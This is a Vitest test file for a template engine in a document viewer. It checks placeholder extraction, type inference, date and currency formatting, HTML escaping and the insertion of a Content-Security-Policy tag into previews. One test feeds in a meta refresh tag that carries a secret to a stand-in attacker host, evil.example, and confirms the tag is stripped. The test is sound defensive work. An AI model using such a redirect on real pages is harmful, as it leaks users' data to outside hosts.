/**
 * templateEngine — pure `{{key}}` placeholder engine (plan 063 Cluster A).
 */
import { describe, it, expect } from 'vitest';
import {
    extractKeys,
    inferType,
    withPreviewCsp,
    PREVIEW_CSP,
    labelFor,
    formatValue,
    escapeHtml,
    renderTemplate,
} from '../components/DocViewer/templateEngine';

describe('extractKeys', () => {
    it('extracts keys in first-appearance order, unique', () => {
        expect(extractKeys('{{a}} {{b}} {{a}}')).toEqual(['a', 'b']);
    });

    it('matches keys with spaces inside the braces', () => {
        expect(extractKeys('{{ title }}')).toEqual(['title']);
    });

    it('matches keys with dashes and dots', () => {
        expect(extractKeys('{{client-name}} {{a.b}}')).toEqual(['client-name', 'a.b']);
    });

    it('returns an empty array when there are no placeholders', () => {
        expect(extractKeys('plain text')).toEqual([]);
    });
});

describe('inferType', () => {
    it('infers date for keys containing "date"', () => {
        expect(inferType('lease_date')).toBe('date');
        expect(inferType('Date')).toBe('date');
    });

    it('infers currency for money-shaped keys', () => {
        for (const key of ['amount', 'price', 'total', 'rent', 'fee', 'deposit', 'balance']) {
            expect(inferType(key)).toBe('currency');
        }
    });

    it('defaults to text', () => {
        expect(inferType('client_name')).toBe('text');
    });

    it('matches whole segments, not substrings', () => {
        // "current"/"parent" contain "rent", "update" contains "date", "coffee" contains "fee".
        for (const key of ['current_address', 'parent_name', 'last_update', 'coffee_order']) {
            expect(inferType(key)).toBe('text');
        }
        expect(inferType('monthly-rent')).toBe('currency');
        expect(inferType('amount_1')).toBe('currency');
        expect(inferType('lease.start.date')).toBe('date');
    });
});

describe('labelFor', () => {
    it('turns snake_case keys into a capitalized label', () => {
        expect(labelFor('client_name')).toBe('Client name');
    });
});

describe('formatValue', () => {
    it('returns an empty string for an empty value', () => {
        expect(formatValue('', 'date')).toBe('');
        expect(formatValue('', 'currency')).toBe('');
    });

    it('formats a date from parts, without a timezone shift', () => {
        // Constructing from y/m/d local components must match a local Date for
        // the same calendar day, regardless of the host timezone (including
        // negative-UTC zones where `new Date('2026-01-05')` would print the 4th).
        expect(formatValue('2026-01-05', 'date')).toBe(new Date(2026, 0, 5).toLocaleDateString());
    });

    it('leaves an unparsable date raw', () => {
        expect(formatValue('not-a-date', 'date')).toBe('not-a-date');
    });

    it('formats a currency amount as USD', () => {
        expect(formatValue('350', 'currency')).toBe(
            new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(350)
        );
    });

    it('leaves an unparsable currency value raw', () => {
        expect(formatValue('$350.00', 'currency')).toBe('$350.00');
    });

    it('passes text and number types through unchanged', () => {
        expect(formatValue('hello', 'text')).toBe('hello');
        expect(formatValue('42', 'number')).toBe('42');
    });
});

describe('escapeHtml', () => {
    it('escapes &, <, >, ", and \'', () => {
        expect(escapeHtml('<b>&"\'')).toBe('&lt;b&gt;&amp;&quot;&#39;');
    });
});

describe('renderTemplate', () => {
    it('substitutes a known, non-empty value', () => {
        expect(renderTemplate('{{title}}', { title: 'Report' }, {})).toBe('Report');
    });

    it('substitutes keys with spaces, dashes, and dots', () => {
        const html = '{{ title }} {{client-name}} {{a.b}}';
        const values = { title: 'T', 'client-name': 'N', 'a.b': 'V' };
        expect(renderTemplate(html, values, {})).toBe('T N V');
    });

    it('leaves the original placeholder text when the value is missing or empty', () => {
        expect(renderTemplate('{{ title }}', {}, {})).toBe('{{ title }}');
        expect(renderTemplate('{{title}}', { title: '' }, {})).toBe('{{title}}');
    });

    it('escapes a value containing HTML', () => {
        expect(renderTemplate('{{v}}', { v: '<b>&"' }, { v: 'text' })).toBe('&lt;b&gt;&amp;&quot;');
    });

    it('inserts $&, $\', and $$ values literally instead of as replace-pattern tokens', () => {
        expect(renderTemplate('{{v}}', { v: '$&' }, { v: 'text' })).toBe(escapeHtml('$&'));
        expect(renderTemplate('{{v}}', { v: "$'" }, { v: 'text' })).toBe(escapeHtml("$'"));
        expect(renderTemplate('{{v}}', { v: '$$' }, { v: 'text' })).toBe('$$');
    });

    it('leaves an unparsable currency-shaped value literal', () => {
        expect(renderTemplate('{{amount}}', { amount: '$350.00' }, {})).toBe('$350.00');
    });

    it('falls back to inferType when no explicit type is given', () => {
        expect(renderTemplate('{{lease_date}}', { lease_date: '2026-01-05' }, {})).toBe(
            new Date(2026, 0, 5).toLocaleDateString()
        );
    });
});

describe('withPreviewCsp', () => {
    const META = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`;

    it('blocks every remote load: default-src none, inline styles and data: images only', () => {
        expect(PREVIEW_CSP).toBe("default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:");
    });

    it('inserts the policy right after <head>, keeping a leading doctype first (standards mode)', () => {
        const out = withPreviewCsp('<!DOCTYPE html><html><head lang="en"><style>b{}</style></head><body></body></html>');
        expect(out.startsWith('<!DOCTYPE html><html><head lang="en">' + META + '<style>')).toBe(true);
    });

    it('does not mistake <header> for <head>; with no head the policy comes first', () => {
        const out = withPreviewCsp('<header>Top</header><p>x</p>');
        expect(out).toBe(META + '<header>Top</header><p>x</p>');
    });

    it('strips meta refresh (CSP cannot stop the frame navigating out with values in the URL)', () => {
        const out = withPreviewCsp('<head><META HTTP-EQUIV="Refresh" content="0;url=https://evil.example/?x=secret"></head><p>ok</p>');
        expect(out).not.toMatch(/refresh/i);
        expect(out).not.toContain('evil.example');
        expect(out).toContain('<p>ok</p>');
    });
});
